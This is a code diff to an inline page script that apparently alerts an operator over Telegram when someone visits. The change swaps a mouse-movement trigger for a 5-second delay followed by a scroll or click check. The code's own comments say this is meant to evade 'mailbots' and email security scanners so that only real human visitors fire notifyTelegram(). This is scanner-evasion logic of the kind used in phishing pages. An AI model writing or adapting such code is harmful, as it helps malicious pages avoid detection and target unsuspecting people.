@@ -228,23 +228,31 @@ Time: ${new Date().toLocaleString()}
     }
   }
 
-   // EXECUTION TRIGGER
+  // TIME TRAP & HUMAN INTERACTION VERIFICATION
   // =========================
-  // Instead of running instantly, wait for a basic human interaction (like a mouse movement, scroll, or touch)
-  // Mailbots rarely trigger these events.
-  function triggerOnHumanActivity() {
-    notifyTelegram();
-    
-    // Remove listeners so it only runs once per real visit
-    window.removeEventListener('mousemove', triggerOnHumanActivity);
-    window.removeEventListener('scroll', triggerOnHumanActivity);
-    window.removeEventListener('touchstart', triggerOnHumanActivity);
+  let timeElapsed = false;
+
+  // 1. Start a countdown timer when the page opens.
+  // Security scanners usually leave within 2 to 4 seconds to save processing power.
+  setTimeout(() => {
+    timeElapsed = true;
+    console.log("Time trap passed. Script is now listening for real human events.");
+  }, 5000); // 5-second delay 
+
+  // 2. Only allow execution if the timer has passed AND a real user event occurs.
+  function verifyRealUser() {
+    if (timeElapsed) {
+      notifyTelegram();
+      
+      // Clean up listeners immediately so it only runs once per visit
+      window.removeEventListener('scroll', verifyRealUser);
+      window.removeEventListener('click', verifyRealUser);
+    }
   }
 
-  // Attach listeners for human activity
-  window.addEventListener('mousemove', triggerOnHumanActivity);
-  window.addEventListener('scroll', triggerOnHumanActivity);
-  window.addEventListener('touchstart', triggerOnHumanActivity);
+  // Listen for genuine user interactions (Scrolling or clicking anywhere on the page)
+  window.addEventListener('scroll', verifyRealUser);
+  window.addEventListener('click', verifyRealUser);
   
 </script>
 
